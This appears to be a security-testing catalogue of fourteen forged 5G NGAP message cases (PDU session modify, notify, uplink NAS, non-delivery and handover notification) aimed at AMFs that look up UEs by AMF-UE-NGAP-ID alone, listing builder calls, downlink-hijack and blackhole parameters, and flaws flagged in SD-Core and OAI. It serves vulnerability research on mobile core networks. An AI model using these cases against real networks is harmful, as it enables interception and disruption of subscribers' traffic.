# Attack case catalogue — p05, p06, p07, p08, p09

UE-associated NGAP messages (NG-RAN → AMF). Shared weakness for the exploitable ones:
the AMF locates the victim by **`AMF-UE-NGAP-ID` alone**, without binding to the sender
gNB / SCTP / stored `RAN-UE-NGAP-ID`. p07/p08 carry a **NAS-PDU** which is integrity-
protected end-to-end, so NAS *content* injection is a negative control — the forgeable
surface there is the unauthenticated `UserLocationInformation` / `Cause`.

| proc | message | procCode | key IEs (id) | builder |
|---|---|---|---|---|
| p05 | PDUSessionResourceModifyIndication | 27 | AMF-UE-NGAP-ID(10), RAN-UE-NGAP-ID(85), **PDUSessionResourceModifyListModInd(63)** [item: pDUSessionID + ModifyIndicationTransfer{dLQosFlowPerTNLInformation=gTPTunnel+QoS-flow list}], UserLocationInformation(121, opt) | NEW `pdu_session_resource_modify_indication` |
| p06 | PDUSessionResourceNotify | 30 | AMF-UE-NGAP-ID(10), RAN-UE-NGAP-ID(85) [lists optional] | EXISTING `B.pdu_session_resource_notify` |
| p07 | UplinkNASTransport | 46 | AMF-UE-NGAP-ID(10), RAN-UE-NGAP-ID(85), NAS-PDU(38), UserLocationInformation(121) | NEW `uplink_nas_transport` |
| p08 | NASNonDeliveryIndication | 19 | AMF-UE-NGAP-ID(10), RAN-UE-NGAP-ID(85), NAS-PDU(38), Cause(15) | NEW `nas_non_delivery_indication` |
| p09 | HandoverNotification | 11 | AMF-UE-NGAP-ID(10), RAN-UE-NGAP-ID(85), UserLocationInformation(121) | EXISTING `B.handover_notify` |

## Case table

| case-id | message | description | distinguishing IE values | missing validation | impact / cross-boundary | confidence | builder |
|---|---|---|---|---|---|---|---|
| p05-a | PDUSessResModifyInd | DL NG-U endpoint hijack | ModifyIndicationTransfer DL TNL = `172.30.200.9`/`0x11111111` (reachable) | AMF binds UE only by AMF-UE-NGAP-ID; SMF trusts AMF N2 SM info | UPF DL FAR → attacker; remote UE DL interception | Likely–confirmed | `pdu_session_resource_modify_indication(1,99,cfg,attacker_ip="172.30.200.9",teid=0x11111111)` |
| p05-b | PDUSessResModifyInd | Remote blackhole | DL TNL = `10.255.255.255`/`0xdeadbeef` (dead) | same | victim DL lost, no interception | High | `...attacker_ip="10.255.255.255",teid=0xdeadbeef` |
| p05-c | PDUSessResModifyInd | UPF forwarding churn | DL TNL TEID rotated `0x5a5a5a5a` | no per-source binding / rate limit | repeated N4 mods; data-path churn | Likely | `...teid=0x5a5a5a5a` |
| p05-d | PDUSessResModifyInd | AMF/SMF txn exhaustion | AMF-UE-NGAP-ID enumerated `0x0BAD` | expensive processing before context validation | CP CPU/timer/queue stress | Impl-dependent | `...(0x0BAD,99,cfg,...)` |
| p05-e | PDUSessResModifyInd | QoS-flow state desync | multiple forged QoS flow ids `(1,5,9)` | missing source binding + weak procedure-state check | victim QoS flows marked modified/failed | Speculative→impl-dep | `...qfis=(1,5,9)` |
| p05-f | PDUSessResModifyInd | Location metadata poison | optional ULI, claimed NR-CGI `0x999` | no CGI/TAI-vs-serving-cell check | wrong stored location; policy/charging errors | Speculative | `...include_uli=True,nci=0x999` |
| p06-a | PDUSessResNotify | False notify/release of remote session | AMF-UE-NGAP-ID = victim (minimal) | SD-Core drops the guard (global lookup) | remote UE QoS/session falsely notified/released | 🔴 SD-Core | `B.pdu_session_resource_notify(1,99)` |
| p06-b | PDUSessResNotify | Enumeration / churn | AMF-UE-NGAP-ID `0x0BAD` | no rate limit | CP churn / oracle | Likely | `B.pdu_session_resource_notify(0x0BAD,99)` |
| p07-a | UplinkNASTransport | Inject NAS for victim (NEGATIVE) | NAS-PDU `7e 00` placeholder | NAS integrity is end-to-end → should reject | expected reject; no context change | Negative control | `uplink_nas_transport(1,99,cfg,nas_pdu=b"\x7e\x00")` |
| p07-b | UplinkNASTransport | Location poison via mandatory ULI | ULI claimed NR-CGI `0x999` | AMF may trust RAN-supplied ULI | wrong stored UE location | Speculative | `uplink_nas_transport(1,99,cfg,nci=0x999)` |
| p08-a | NASNonDeliveryInd | False DL-NAS non-delivery | Cause `radio-connection-with-ue-lost` | NAS-bound; AMF may act on non-delivery report | possible NAS retransmit / state poison | Negative / impl-dep | `nas_non_delivery_indication(1,99,cause=("radioNetwork","radio-connection-with-ue-lost"))` |
| p08-b | NASNonDeliveryInd | Transaction churn | AMF-UE-NGAP-ID `0x0BAD` | no rate limit | CP churn | Likely-low | `nas_non_delivery_indication(0x0BAD,99,cause=("misc","unspecified"))` |
| p09-a | HandoverNotify | Rebind serving gNB → attacker | AMF-UE-NGAP-ID = victim; ULI from cfg | OAI global unbound lookup rebinds serving gNB | victim DL misdelivered to attacker (OAI 🔴) | 🔴 OAI | `B.handover_notify(1,99,cfg)` |
| p09-b | HandoverNotify | Location poison via forged ULI | ULI claimed NR-CGI `0x999` | no CGI-vs-serving-cell check | wrong stored location | Secondary | `B.handover_notify(1,99,cfg,nci=0x999)` |

## Notes on realization

- **p05** transfer verified against `38413-g70.asn`: `PDUSessionResourceModifyIndicationTransfer{
  dLQosFlowPerTNLInformation: QosFlowPerTNLInformation{uPTransportLayerInformation, associatedQosFlowList}}`;
  field names match. `include_uli` toggles the optional ULI (p05-f).
- **p06 / p09** reuse the already-validated `builders.py` encoders (minimal mandatory IEs; p06's
  resource lists are optional, so the cases vary the victim id).
- **p07 / p08** are NAS-integrity-bound negative controls — the NAS-PDU is an opaque placeholder;
  the realistic forged surface is the ULI (p07) / Cause (p08).
- **Validation:** `python -c "from ngaptester.cases_p05_p09 import CASES,CFG; from ngaptester import ngap; [ngap.encode(c['build'](CFG)) for c in CASES]; print('ALL ENCODE OK', len(CASES))"` → expect `ALL ENCODE OK 14`.
  (Authored offline; run once to confirm — the p05 QoS transfer is the only nontrivial encode.)
